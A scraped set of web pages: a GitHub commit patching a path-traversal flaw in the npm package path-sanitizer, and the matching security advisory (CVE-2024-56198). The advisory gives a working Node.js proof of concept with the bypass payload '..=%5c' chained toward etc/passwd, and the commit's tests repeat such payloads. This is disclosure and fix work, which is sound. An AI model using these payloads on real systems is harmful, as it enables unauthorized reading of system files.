=== Content from www.loom.com_5e2761b8_20250115_082709.html ===

# Loom is running a bit slower than usual.

Contact support if this issue persists.

[Go to Homepage](/)
[Check System Status](https://www.loomstatus.com)



=== Content from github.com_31aed4b7_20250115_082705.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcabraviva%2Fpath-sanitizer%2Fcommit%2Fb6d2319eac910dffdfacc8460f5b5cc5a1518ead)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcabraviva%2Fpath-sanitizer%2Fcommit%2Fb6d2319eac910dffdfacc8460f5b5cc5a1518ead)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=cabraviva%2Fpath-sanitizer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cabraviva](/cabraviva)
/
**[path-sanitizer](/cabraviva/path-sanitizer)**
Public

* [Notifications](/login?return_to=%2Fcabraviva%2Fpath-sanitizer) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2Fcabraviva%2Fpath-sanitizer)
* [Star
   1](/login?return_to=%2Fcabraviva%2Fpath-sanitizer)

* [Code](/cabraviva/path-sanitizer)
* [Issues
  0](/cabraviva/path-sanitizer/issues)
* [Pull requests
  0](/cabraviva/path-sanitizer/pulls)
* [Actions](/cabraviva/path-sanitizer/actions)
* [Projects
  0](/cabraviva/path-sanitizer/projects)
* [Security](/cabraviva/path-sanitizer/security)
* [Insights](/cabraviva/path-sanitizer/pulse)

Additional navigation options

* [Code](/cabraviva/path-sanitizer)
* [Issues](/cabraviva/path-sanitizer/issues)
* [Pull requests](/cabraviva/path-sanitizer/pulls)
* [Actions](/cabraviva/path-sanitizer/actions)
* [Projects](/cabraviva/path-sanitizer/projects)
* [Security](/cabraviva/path-sanitizer/security)
* [Insights](/cabraviva/path-sanitizer/pulse)

## Commit

[Permalink](/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request [#2](https://github.com/cabraviva/path-sanitizer/pull/2) from cabraviva/dev

[Browse files](/cabraviva/path-sanitizer/tree/b6d2319eac910dffdfacc8460f5b5cc5a1518ead)
Browse the repository at this point in the history

```
Fixed a security vulnerability
```

* Loading branch information

[![@cabraviva](https://avatars.githubusercontent.com/u/64889695?s=40&v=4)](/cabraviva)

[cabraviva](/cabraviva/path-sanitizer/commits?author=cabraviva "View all commits by cabraviva")
authored
Dec 31, 2024

2 parents
[b37caa7](/cabraviva/path-sanitizer/commit/b37caa71af1d43720f1598454d9c72dd0e259ad1)
+
[bb2e758](/cabraviva/path-sanitizer/commit/bb2e75880592b804ba20ba70b8e9f0b185ea5a79)

commit b6d2319

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**80 additions**
and
**62 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* lib

  + lib/index.test.ts
    [index.test.ts](#diff-2a06629d12222218cf60c7cac76d2a8e6980c0d2bd20b1403c177c2f633725b4)
  + lib/index.ts
    [index.ts](#diff-d5a4b3a0309f2337144861084c1014523cced561eb722cb9684c63f5e41e0567)
* package.json
  [package.json](#diff-7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519)
* pnpm-lock.yaml
  [pnpm-lock.yaml](#diff-32824c984905bb02bc7ffcef96a77addd1f1602cff71a11fbbfdd7f53ee026bb)

## There are no files selected for viewing

4 changes: 4 additions & 0 deletions

4
[lib/index.test.ts](#diff-2a06629d12222218cf60c7cac76d2a8e6980c0d2bd20b1403c177c2f633725b4 "lib/index.test.ts")

Show comments

[View file](/cabraviva/path-sanitizer/blob/b6d2319eac910dffdfacc8460f5b5cc5a1518ead/lib/index.test.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -192,4 +192,8 @@ describe('sanitize() - Vulnerability Tests', () => { |
|  |  | it('Protects reported vulnerability #1', () => { |
|  |  | expect(linuxSlash(join('/var/app-dir', sanitize("..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc/passwd")))).not.toBe('/etc/passwd') |
|  |  | }) |
|  |  |  |
|  |  | it('Protects reported vulnerability #2', () => { |
|  |  | expect(linuxSlash(join('/var/app', sanitize("./../../test/../../../../../../../../../../etc/passwd")))).not.toBe('/etc/passwd') |
|  |  | }) |
|  |  | }) |

14 changes: 14 additions & 0 deletions

14
[lib/index.ts](#diff-d5a4b3a0309f2337144861084c1014523cced561eb722cb9684c63f5e41e0567 "lib/index.ts")

Show comments

[View file](/cabraviva/path-sanitizer/blob/b6d2319eac910dffdfacc8460f5b5cc5a1518ead/lib/index.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -103,6 +103,20 @@ export default function sanitize(pathstr: string, options: SanitizeOptions = DEF |
|  |  | // Replace double (back)slashes with a single slash |
|  |  | sanitizedPath = sanitizedPath.replace(/[\/\\]+/g, '/') |
|  |  |  |
|  |  | // Replace /../ with / |
|  |  | sanitizedPath = sanitizedPath.replace(options.parentDirectoryRegEx, '/') |
|  |  |  |
|  |  | // Remove ./ or / at start |
|  |  | while (sanitizedPath.startsWith('/') || sanitizedPath.startsWith('./') || sanitizedPath.endsWith('/..') || sanitizedPath.endsWith('/../') || sanitizedPath.startsWith('../') || sanitizedPath.startsWith('/../')) { |
|  |  | sanitizedPath = sanitizedPath.replace(/^\.\//g, '') // ^./ |
|  |  | sanitizedPath = sanitizedPath.replace(/^\//g, '') // ^/ |
|  |  | // Remove ../ | /../ at pos 0 and /.. | /../ at end |
|  |  | sanitizedPath = sanitizedPath.replace(/^[\/\\]\.\.[\/\\]/g, '/') |
|  |  | sanitizedPath = sanitizedPath.replace(/^\.\.[\/\\]/g, '/') |
|  |  | sanitizedPath = sanitizedPath.replace(/[\/\\]\.\.$/g, '/') |
|  |  | sanitizedPath = sanitizedPath.replace(/[\/\\]\.\.\/$/g, '/') |
|  |  | } |
|  |  |  |
|  |  | // Make sure out is not "." |
|  |  | sanitizedPath = sanitizedPath.trim() === '.' ? '' : sanitizedPath |
|  |  |  |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[package.json](#diff-7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519 "package.json")

Show comments

[View file](/cabraviva/path-sanitizer/blob/b6d2319eac910dffdfacc8460f5b5cc5a1518ead/package.json)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -20,8 +20,8 @@ |
|  |  | "homepage": "https://github.com/cabraviva/path-sanitizer#readme", |
|  |  | "types": "dist/index.d.ts", |
|  |  | "devDependencies": { |
|  |  | "@types/node": "^22.9.3", |
|  |  | "@types/node": "^22.10.2", |
|  |  | "typescript": "^5.7.2", |
|  |  | "vitest": "^2.1.5" |
|  |  | "vitest": "^2.1.8" |
|  |  | } |
|  |  | } |

120 changes: 60 additions & 60 deletions

120
[pnpm-lock.yaml](#diff-32824c984905bb02bc7ffcef96a77addd1f1602cff71a11fbbfdd7f53ee026bb "pnpm-lock.yaml")

Show comments

[View file](/cabraviva/path-sanitizer/blob/b6d2319eac910dffdfacc8460f5b5cc5a1518ead/pnpm-lock.yaml)
Edit file

Delete file

Load diff

Some generated files are not rendered by default. Learn more about [how customized files appear on GitHub](https://docs.github.com/github/administering-a-repository/customizing-how-changed-files-appear-on-github).

Oops, something went wrong.

Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `b6d2319`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcabraviva%2Fpath-sanitizer%2Fcommit%2Fb6d2319eac910dffdfacc8460f5b5cc5a1518ead) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_f6790d93_20250115_082707.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcabraviva%2Fpath-sanitizer%2Fsecurity%2Fadvisories%2FGHSA-94p5-r7cc-3rpr)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcabraviva%2Fpath-sanitizer%2Fsecurity%2Fadvisories%2FGHSA-94p5-r7cc-3rpr)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=cabraviva%2Fpath-sanitizer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cabraviva](/cabraviva)
/
**[path-sanitizer](/cabraviva/path-sanitizer)**
Public

* [Notifications](/login?return_to=%2Fcabraviva%2Fpath-sanitizer) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2Fcabraviva%2Fpath-sanitizer)
* [Star
   1](/login?return_to=%2Fcabraviva%2Fpath-sanitizer)

* [Code](/cabraviva/path-sanitizer)
* [Issues
  0](/cabraviva/path-sanitizer/issues)
* [Pull requests
  0](/cabraviva/path-sanitizer/pulls)
* [Actions](/cabraviva/path-sanitizer/actions)
* [Projects
  0](/cabraviva/path-sanitizer/projects)
* [Security](/cabraviva/path-sanitizer/security)
* [Insights](/cabraviva/path-sanitizer/pulse)

Additional navigation options

* [Code](/cabraviva/path-sanitizer)
* [Issues](/cabraviva/path-sanitizer/issues)
* [Pull requests](/cabraviva/path-sanitizer/pulls)
* [Actions](/cabraviva/path-sanitizer/actions)
* [Projects](/cabraviva/path-sanitizer/projects)
* [Security](/cabraviva/path-sanitizer/security)
* [Insights](/cabraviva/path-sanitizer/pulse)

# Bypassing the existing filters to achieve path-traversal vulnerability

Critical

[cabraviva](/cabraviva)
published
GHSA-94p5-r7cc-3rpr
Dec 31, 2024

## Package

npm

path-sanitizer
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<3.1.0

## Patched versions

3.1.0

## Description

### Summary

This is a POC for a path-sanitizer [npm package](https://www.npmjs.com/package/path-sanitizer). The filters can be bypassed and can result in path traversal.

Payload: `..=%5c` can be used to bypass this on CLI (along with other candidates). I am assuming something similar would work on web apps as well.

### PoC

Here's the code to test for the filter bypass (I am basing this on the example provided in the documentation.)

```
const sanitize = require("path-sanitizer")
const path = require("path")
const fs = require("fs")

// Real scenario:
function routeHandler(myPath) {
  // Lets just assume that the path was extracted from the request
  // We want to read a file in the C:\Users\user\Desktop\myApp\ directory
  // But the user should be able to access C:\Users\user\Desktop\
  // So we need to sanitize the path

  const APP_DIR = "/var/hacker"
  const sanitized = path.join(APP_DIR, sanitize(myPath))

  // Now we would usally read the file
  // But in this case we just gonna print the path
  // console.log(sanitized)
  return sanitized
}

function readFile(filePath) {
  const absolutePath = path.resolve(filePath) // Resolve to absolute path

  fs.readFile(absolutePath, "utf8", (err, data) => {
    if (err) {
      console.error(`Error reading the file: ${err.message}`)
      return
    }
    console.log(`Contents of the file ${filePath} :\n${data}`)
  })
}

input_user_bypass = "..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5ctmp/hacked.txt"
// input_user_bypass = "..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc/passwd"
input_user_payload = "../../../../../../../../tmp/hacked.txt"

readFile(routeHandler(input_user_bypass))
readFile(routeHandler(input_user_payload))
```

I am also attaching a video POC: (this is a Loom POC, only users with the UUID of the video can see it)

<https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d>

### Impact

Any CLI tool or library using this package can be/will be vulnerable to Path traversal.

### Severity

Critical

### CVE ID

CVE-2024-56198

### Weaknesses

No CWEs

### Credits

* [![@realArcherL](https://avatars.githubusercontent.com/u/42532003?s=40&v=4)](/realArcherL)
  [realArcherL](/realArcherL)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


